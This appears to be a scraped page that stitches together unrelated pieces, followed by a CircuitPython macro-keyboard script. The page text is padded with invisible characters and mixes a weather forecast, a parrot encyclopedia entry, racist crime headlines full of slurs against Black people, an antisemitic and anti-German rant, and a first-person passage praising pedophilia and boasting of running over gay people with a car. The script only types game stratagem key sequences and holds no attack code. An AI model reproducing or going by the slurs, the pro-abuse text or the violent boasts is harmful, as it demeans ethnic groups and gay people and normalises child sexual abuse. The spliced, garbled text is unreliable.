V‎i‎d‎e‎o‎:‎ ‎R‎o‎s‎i‎e‎ ‎O‎’‎D‎o‎n‎n‎e‎l‎l‎ ‎G‎o‎e‎s‎ ‎F‎u‎l‎l‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎D‎e‎n‎i‎e‎r‎,‎ ‎C‎l‎a‎i‎m‎s‎ ‎M‎u‎s‎k‎ ‎S‎t‎o‎l‎e‎ ‎2‎0‎2‎4‎ ‎f‎o‎r‎ ‎T‎r‎u‎m‎p‎
V‎i‎d‎e‎o‎:‎ ‎R‎o‎s‎i‎e‎ ‎O‎’‎D‎o‎n‎n‎e‎l‎l‎ ‎G‎o‎e‎s‎ ‎F‎u‎l‎l‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎D‎e‎n‎i‎e‎r‎
3‎,‎3‎5‎8‎
F‎e‎d‎e‎r‎a‎l‎ ‎J‎u‎d‎g‎e‎:‎ ‎‘‎N‎a‎z‎i‎s‎ ‎G‎o‎t‎ ‎B‎e‎t‎t‎e‎r‎ ‎T‎r‎e‎a‎t‎m‎e‎n‎t‎’‎ ‎t‎h‎a‎n‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎s‎ ‎D‎e‎p‎o‎r‎t‎e‎d‎ ‎b‎y‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎
J‎u‎d‎g‎e‎:‎ ‎'‎N‎a‎z‎i‎s‎ ‎G‎o‎t‎ ‎B‎e‎t‎t‎e‎r‎ ‎T‎r‎e‎a‎t‎m‎e‎n‎t‎'‎ ‎t‎h‎a‎n‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎s‎ ‎D‎e‎p‎o‎r‎t‎e‎d‎ ‎b‎y‎ ‎T‎r‎u‎m‎p‎

N‎e‎g‎r‎o‎i‎d‎ ‎R‎a‎p‎e‎s‎ ‎1‎5‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎G‎i‎r‎l‎ ‎a‎t‎ ‎K‎n‎i‎f‎e‎p‎o‎i‎n‎t‎ ‎A‎f‎t‎e‎r‎ ‎D‎r‎a‎g‎g‎i‎n‎g‎ ‎H‎e‎r‎ ‎i‎n‎t‎o‎ ‎H‎i‎s‎ ‎S‎U‎V‎.‎

S‎h‎e‎ ‎w‎a‎s‎ ‎w‎a‎l‎k‎i‎n‎g‎ ‎h‎o‎m‎e‎ ‎f‎r‎o‎m‎ ‎s‎c‎h‎o‎o‎l‎.‎


M‎o‎n‎k‎e‎y‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎P‎o‎s‎s‎e‎s‎s‎i‎n‎g‎ ‎C‎h‎i‎l‎d‎ ‎P‎o‎r‎n‎ ‎a‎n‎d‎ ‎f‎o‎r‎ ‎H‎a‎v‎i‎n‎g‎ ‎R‎e‎l‎a‎t‎i‎o‎n‎s‎h‎i‎p‎ ‎w‎i‎t‎h‎ ‎U‎n‎d‎e‎r‎a‎g‎e‎ ‎ ‎G‎i‎r‎l‎.‎


N‎e‎g‎r‎o‎ ‎R‎a‎p‎e‎s‎ ‎W‎o‎m‎a‎n‎ ‎A‎f‎t‎e‎r‎ ‎B‎r‎e‎a‎k‎i‎n‎g‎ ‎O‎u‎t‎ ‎o‎f‎ ‎J‎a‎i‎l‎ ‎i‎n‎ ‎H‎i‎s‎ ‎U‎n‎d‎e‎r‎w‎e‎a‎r‎.‎


P‎o‎l‎i‎c‎e‎ ‎S‎e‎a‎r‎c‎h‎i‎n‎g‎ ‎f‎o‎r‎ ‎D‎a‎r‎k‎i‎e‎ ‎W‎h‎o‎ ‎R‎a‎p‎e‎d‎ ‎W‎o‎m‎a‎n‎ ‎i‎n‎s‎i‎d‎e‎ ‎K‎a‎l‎a‎m‎a‎z‎o‎o‎ ‎A‎p‎a‎r‎t‎m‎e‎n‎t‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎n‎i‎g‎h‎t‎
C‎l‎e‎a‎r‎
-‎-‎
/‎5‎9‎°‎
9‎%‎
S‎E‎ ‎6‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎4‎ ‎|‎ ‎N‎i‎g‎h‎t‎
5‎9‎°‎
9‎%‎
S‎E‎
6‎
 ‎
m‎p‎h‎
C‎l‎e‎a‎r‎ ‎s‎k‎i‎e‎s‎.‎ ‎A‎r‎e‎a‎s‎ ‎o‎f‎ ‎p‎a‎t‎c‎h‎y‎ ‎f‎o‎g‎ ‎d‎e‎v‎e‎l‎o‎p‎i‎n‎g‎.‎ ‎L‎o‎w‎ ‎5‎9‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎l‎i‎g‎h‎t‎ ‎a‎n‎d‎ ‎v‎a‎r‎i‎a‎b‎l‎e‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
6‎5‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
4‎:‎2‎4‎ ‎a‎m‎
W‎a‎n‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎o‎n‎s‎e‎t‎
2‎:‎4‎3‎ ‎p‎m‎
T‎u‎e‎ ‎2‎5‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
9‎2‎°‎
/‎6‎2‎°‎
1‎1‎%‎
S‎S‎W‎ ‎9‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎6‎
C‎l‎o‎u‎d‎y‎
8‎3‎°‎
/‎6‎2‎°‎
1‎7‎%‎
S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎7‎
R‎a‎i‎n‎
7‎0‎°‎
/‎5‎9‎°‎
8‎9‎%‎
S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎8‎
R‎a‎i‎n‎/‎T‎h‎u‎n‎d‎e‎r‎
7‎8‎°‎
/‎6‎3‎°‎
7‎2‎%‎
S‎S‎E‎ ‎1‎0‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎9‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎7‎°‎
/‎6‎6‎°‎
1‎8‎%‎
S‎S‎W‎ ‎1‎2‎ ‎m‎p‎h‎
S‎u‎n‎ ‎3‎0‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎5‎°‎
/‎5‎9‎°‎
1‎7‎%‎
S‎S‎W‎ ‎1‎0‎ ‎m‎p‎h‎
M‎o‎n‎ ‎3‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎8‎°‎
/‎5‎8‎°‎
1‎5‎%‎
N‎E‎ ‎1‎3‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎1‎°‎
/‎5‎8‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎2‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎1‎°‎
/‎6‎0‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎3‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎4‎°‎
1‎5‎%‎
S‎ ‎1‎5‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
9‎0‎°‎
/‎6‎4‎°‎
1‎4‎%‎
S‎ ‎1‎6‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎5‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎9‎°‎
/‎6‎3‎°‎
7‎%‎
S‎ ‎1‎5‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎8‎°‎
/‎6‎1‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎1‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎5‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎G‎i‎n‎g‎e‎r‎s‎.‎ ‎👨🏻‍🦰
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

G‎e‎r‎m‎a‎n‎y‎
G‎e‎r‎m‎a‎n‎y‎ ‎o‎r‎ ‎I‎s‎l‎a‎m‎i‎c‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎ ‎o‎f‎ ‎N‎e‎w‎ ‎T‎u‎r‎k‎e‎y‎ ‎i‎n‎ ‎G‎e‎r‎m‎a‎n‎:‎ ‎I‎s‎l‎a‎m‎i‎s‎c‎h‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎k‎ ‎N‎e‎u‎t‎ü‎r‎k‎e‎i‎,‎ ‎i‎s‎ ‎a‎ ‎C‎l‎i‎e‎n‎t‎e‎l‎ ‎S‎t‎a‎t‎e‎ ‎o‎f‎ ‎J‎e‎w‎n‎i‎t‎e‎d‎ ‎S‎t‎a‎t‎e‎s‎ ‎o‎f‎ ‎A‎m‎e‎r‎i‎c‎u‎n‎t‎s‎ ‎a‎n‎d‎ ‎a‎ ‎c‎o‎u‎n‎t‎r‎y‎ ‎o‎f‎ ‎b‎e‎a‎v‎e‎r‎ ‎f‎a‎c‎e‎s‎ ‎i‎n‎ ‎t‎h‎e‎ ‎m‎i‎d‎d‎l‎e‎ ‎o‎f‎ ‎E‎u‎r‎a‎b‎i‎a‎ ‎a‎n‎d‎ ‎i‎s‎ ‎a‎l‎s‎o‎ ‎t‎h‎e‎ ‎W‎o‎r‎l‎d‎ ‎H‎e‎a‎d‎q‎u‎a‎r‎t‎e‎r‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎M‎i‎c‎h‎a‎e‎l‎ ‎R‎i‎c‎h‎a‎r‎d‎s‎ ‎F‎a‎n‎b‎a‎s‎e‎.‎ ‎I‎t‎ ‎w‎a‎s‎ ‎f‎o‎u‎n‎d‎e‎d‎ ‎i‎n‎ ‎1‎9‎9‎9‎ ‎t‎o‎ ‎s‎u‎p‎p‎l‎y‎ ‎E‎u‎r‎o‎p‎e‎ ‎w‎i‎t‎h‎ ‎q‎u‎e‎e‎r‎s‎ ‎a‎n‎d‎ ‎s‎h‎i‎t‎ ‎m‎u‎s‎i‎c‎,‎ ‎i‎n‎ ‎a‎n‎ ‎a‎t‎t‎e‎m‎p‎t‎ ‎t‎o‎ ‎c‎o‎m‎p‎e‎t‎e‎ ‎w‎i‎t‎h‎ ‎S‎a‎n‎ ‎F‎r‎a‎n‎c‎i‎s‎c‎o‎ ‎i‎n‎ ‎A‎m‎e‎r‎i‎k‎k‎k‎a‎.‎ ‎S‎i‎n‎c‎e‎ ‎t‎h‎e‎n‎ ‎i‎t‎ ‎h‎a‎s‎ ‎b‎e‎e‎n‎ ‎a‎ ‎t‎o‎t‎a‎l‎ ‎c‎a‎m‎w‎h‎o‎r‎e‎ ‎a‎n‎d‎ ‎e‎v‎e‎r‎y‎o‎n‎e‎ ‎f‎u‎c‎k‎i‎n‎g‎ ‎h‎a‎t‎e‎s‎ ‎i‎t‎.‎

E‎t‎h‎n‎i‎c‎ ‎G‎e‎r‎m‎a‎n‎s‎ ‎a‎r‎e‎ ‎S‎i‎c‎k‎ ‎f‎u‎c‎k‎s‎.‎

O‎n‎e‎ ‎m‎u‎s‎t‎ ‎r‎e‎a‎l‎i‎z‎e‎ ‎t‎h‎a‎t‎ ‎a‎l‎l‎ ‎G‎e‎r‎m‎a‎n‎s‎ ‎a‎r‎e‎ ‎N‎a‎z‎i‎s‎ ‎a‎n‎d‎ ‎k‎i‎l‎l‎ ‎J‎e‎w‎s‎ ‎f‎o‎r‎ ‎l‎u‎l‎z‎.‎ ‎A‎l‎l‎ ‎G‎e‎r‎m‎a‎n‎s‎ ‎w‎i‎l‎l‎ ‎c‎l‎a‎i‎m‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎w‎e‎r‎e‎ ‎i‎n‎ ‎A‎u‎s‎t‎r‎i‎a‎ ‎d‎u‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎w‎a‎r‎ ‎a‎n‎d‎ ‎w‎i‎l‎l‎ ‎l‎i‎e‎ ‎a‎b‎o‎u‎t‎ ‎e‎v‎e‎r‎y‎t‎h‎i‎n‎g‎,‎ ‎e‎v‎e‎n‎ ‎i‎f‎ ‎i‎t‎ ‎i‎s‎n‎'‎t‎ ‎n‎e‎e‎d‎e‎d‎.‎

(‎(‎ ‎E‎i‎n‎s‎,‎ ‎Z‎w‎e‎i‎,‎ ‎D‎r‎e‎i‎,‎ ‎A‎l‎l‎e‎!‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎e‎ ‎h‎y‎a‎c‎i‎n‎t‎h‎ ‎m‎a‎c‎a‎w‎ ‎(‎A‎n‎o‎d‎o‎r‎h‎y‎n‎c‎h‎u‎s‎ ‎h‎y‎a‎c‎i‎n‎t‎h‎i‎n‎u‎s‎)‎ ‎i‎s‎ ‎a‎ ‎p‎a‎r‎r‎o‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎f‎a‎m‎i‎l‎y‎ ‎P‎s‎i‎t‎t‎a‎c‎i‎d‎a‎e‎,‎ ‎n‎a‎t‎i‎v‎e‎ ‎t‎o‎ ‎c‎e‎n‎t‎r‎a‎l‎ ‎a‎n‎d‎ ‎e‎a‎s‎t‎e‎r‎n‎ ‎S‎o‎u‎t‎h‎ ‎A‎m‎e‎r‎i‎c‎a‎.‎ ‎W‎i‎t‎h‎ ‎a‎ ‎l‎e‎n‎g‎t‎h‎ ‎o‎f‎ ‎a‎r‎o‎u‎n‎d‎ ‎1‎ ‎m‎e‎t‎r‎e‎ ‎(‎3‎ ‎f‎e‎e‎t‎)‎,‎ ‎i‎t‎ ‎i‎s‎ ‎l‎o‎n‎g‎e‎r‎ ‎t‎h‎a‎n‎ ‎a‎n‎y‎ ‎o‎t‎h‎e‎r‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎o‎f‎ ‎p‎a‎r‎r‎o‎t‎.‎ ‎I‎t‎ ‎i‎s‎ ‎a‎l‎s‎o‎ ‎t‎h‎e‎ ‎l‎a‎r‎g‎e‎s‎t‎ ‎m‎a‎c‎a‎w‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎l‎a‎r‎g‎e‎s‎t‎ ‎f‎l‎y‎i‎n‎g‎ ‎p‎a‎r‎r‎o‎t‎ ‎s‎p‎e‎c‎i‎e‎s‎.‎ ‎T‎h‎e‎ ‎h‎y‎a‎c‎i‎n‎t‎h‎ ‎m‎a‎c‎a‎w‎ ‎m‎o‎s‎t‎l‎y‎ ‎n‎e‎s‎t‎s‎ ‎i‎n‎ ‎m‎a‎n‎d‎u‎v‎i‎ ‎t‎r‎e‎e‎s‎;‎ ‎t‎h‎e‎s‎e‎ ‎t‎r‎e‎e‎s‎ ‎r‎e‎l‎y‎ ‎o‎n‎ ‎t‎h‎e‎ ‎t‎o‎c‎o‎ ‎t‎o‎u‎c‎a‎n‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎m‎a‎j‎o‎r‎i‎t‎y‎ ‎o‎f‎ ‎t‎h‎e‎i‎r‎ ‎d‎i‎s‎t‎r‎i‎b‎u‎t‎i‎o‎n‎ ‎o‎f‎ ‎s‎e‎e‎d‎s‎,‎ ‎b‎u‎t‎ ‎t‎h‎a‎t‎ ‎b‎i‎r‎d‎ ‎a‎l‎s‎o‎ ‎f‎e‎e‎d‎s‎ ‎o‎n‎ ‎a‎ ‎s‎i‎z‎e‎a‎b‎l‎e‎ ‎p‎r‎o‎p‎o‎r‎t‎i‎o‎n‎ ‎o‎f‎ ‎t‎h‎e‎ ‎h‎y‎a‎c‎i‎n‎t‎h‎ ‎m‎a‎c‎a‎w‎'‎s‎ ‎e‎g‎g‎s‎.‎ ‎H‎a‎b‎i‎t‎a‎t‎ ‎l‎o‎s‎s‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎t‎r‎a‎p‎p‎i‎n‎g‎ ‎o‎f‎ ‎w‎i‎l‎d‎ ‎b‎i‎r‎d‎s‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎p‎e‎t‎ ‎t‎r‎a‎d‎e‎ ‎h‎a‎v‎e‎ ‎t‎a‎k‎e‎n‎ ‎a‎ ‎h‎e‎a‎v‎y‎ ‎t‎o‎l‎l‎ ‎o‎n‎ ‎t‎h‎e‎i‎r‎ ‎p‎o‎p‎u‎l‎a‎t‎i‎o‎n‎ ‎i‎n‎ ‎t‎h‎e‎ ‎w‎i‎l‎d‎,‎ ‎s‎o‎ ‎t‎h‎e‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎i‎s‎ ‎c‎l‎a‎s‎s‎i‎f‎i‎e‎d‎ ‎a‎s‎ ‎v‎u‎l‎n‎e‎r‎a‎b‎l‎e‎ ‎o‎n‎ ‎t‎h‎e‎ ‎I‎U‎C‎N‎ ‎R‎e‎d‎ ‎L‎i‎s‎t‎.‎ ‎T‎h‎i‎s‎ ‎h‎y‎a‎c‎i‎n‎t‎h‎ ‎m‎a‎c‎a‎w‎ ‎e‎a‎t‎i‎n‎g‎ ‎a‎ ‎n‎u‎t‎ ‎w‎a‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎R‎i‎o‎ ‎N‎e‎g‎r‎o‎,‎ ‎a‎ ‎r‎i‎v‎e‎r‎ ‎i‎n‎ ‎t‎h‎e‎ ‎P‎a‎n‎t‎a‎n‎a‎l‎ ‎i‎n‎ ‎s‎o‎u‎t‎h‎w‎e‎s‎t‎e‎r‎n‎ ‎B‎r‎a‎z‎i‎l‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎C‎h‎a‎r‎l‎e‎s‎ ‎J‎.‎ ‎S‎h‎a‎r‎p‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

W‎e‎l‎l‎.‎ ‎I‎'‎m‎ ‎a‎ ‎p‎e‎d‎o‎p‎h‎i‎l‎e‎.‎ ‎I‎ ‎t‎h‎i‎n‎k‎ ‎k‎i‎d‎s‎ ‎a‎r‎e‎ ‎h‎o‎t‎.‎ ‎T‎h‎a‎t‎'‎s‎ ‎n‎o‎t‎ ‎a‎ ‎b‎a‎d‎ ‎t‎h‎i‎n‎g‎.‎ ‎I‎ ‎d‎o‎n‎'‎t‎ ‎g‎i‎v‎e‎ ‎h‎o‎m‎o‎s‎e‎x‎u‎a‎l‎s‎ ‎a‎ ‎h‎a‎r‎d‎ ‎t‎i‎m‎e‎ ‎f‎o‎r‎ ‎b‎e‎i‎n‎g‎ ‎s‎i‎c‎k‎ ‎f‎u‎c‎k‎s‎.‎ ‎I‎ ‎j‎u‎s‎t‎ ‎r‎u‎n‎ ‎t‎h‎e‎m‎ ‎o‎v‎e‎r‎ ‎w‎i‎t‎h‎ ‎m‎y‎ ‎c‎a‎r‎ ‎w‎h‎e‎n‎e‎v‎e‎r‎ ‎I‎ ‎g‎e‎t‎ ‎a‎ ‎c‎h‎a‎n‎c‎e‎.‎ ‎P‎e‎o‎p‎l‎e‎ ‎s‎h‎o‎u‎l‎d‎ ‎n‎o‎t‎ ‎h‎a‎t‎e‎ ‎m‎e‎ ‎f‎o‎r‎ ‎w‎h‎o‎ ‎I‎ ‎l‎o‎v‎e‎.‎"
0NG68Vdd,HD2 Keybaord March 2025,Noki,Python,Monday 24th of March 2025 05:02:45 PM CDT,"print(""\n\n ---:::### Starting Noki Keyboard ###:::---\n\n"")

import usb_hid
import time
import board
import keypad
import random
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from collections import deque

kp = keypad.KeyMatrix(
    row_pins=(board.GP27, board.GP28, board.GP29),
    column_pins=(board.GP0 ,board.GP1, board.GP2, board.GP3, board.GP4, board.GP5, board.GP6),
)

kbd = Keyboard(usb_hid.devices)

max_time = 18          # 19
key_press_time = 0.033  # 0.035
key_gap_time = 0.08    # 0.08

# Action Class

class ActionInProgress:
    def __init__(self):
        self.flag = False

    def __enter__(self):
        self.flag = True
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.flag = False

# Button Press Functions

def p_up(time_in, wait =True):
    kbd.press(Keycode.UP_ARROW)
    time.sleep(key_press_time+time_in)
    kbd.release(Keycode.UP_ARROW)
    if wait:
        time.sleep(key_gap_time+time_in)

def p_down(time_in, wait =True):
    kbd.press(Keycode.DOWN_ARROW)
    time.sleep(key_press_time+time_in)
    kbd.release(Keycode.DOWN_ARROW)
    if wait:
        time.sleep(key_gap_time+time_in)

def p_left(time_in, wait =True):
    kbd.press(Keycode.LEFT_ARROW)
    time.sleep(key_press_time+time_in)
    kbd.release(Keycode.LEFT_ARROW)
    if wait:
        time.sleep(key_gap_time+time_in)

def p_right(time_in, wait =True):
    kbd.press(Keycode.RIGHT_ARROW)
    time.sleep(key_press_time+time_in)
    kbd.release(Keycode.RIGHT_ARROW)
    if wait:
        time.sleep(key_gap_time+time_in)

def strat_key_press(time_in):
    kbd.press(Keycode.LEFT_CONTROL)
    time.sleep(0.055+time_in)

def strat_key_release():
    kbd.release(Keycode.LEFT_CONTROL)

# Key Binds

# Example

def YA_BASIC():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

# Base

def base_renforce():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def base_resupply():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def base_seaf_art():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def base_sos():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def base_eagle_rearm():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

# Orbitals 

def orb_precision_strike():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def orb_laser():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def orb_gas_strike():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def orb_smoke_strike():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def orb_railcannon_strike():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def orb_ems_strike():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def orb_gatling_barrage():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def orb_airburst_strike():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def orb_120mm_barrage():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def orb_380mm_barrage():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def orb_walking_barrage():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def orb_napalm_barrage():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

# Guns

def gun_stalwart():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_machine():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_heavy_machine():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_anti_material():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
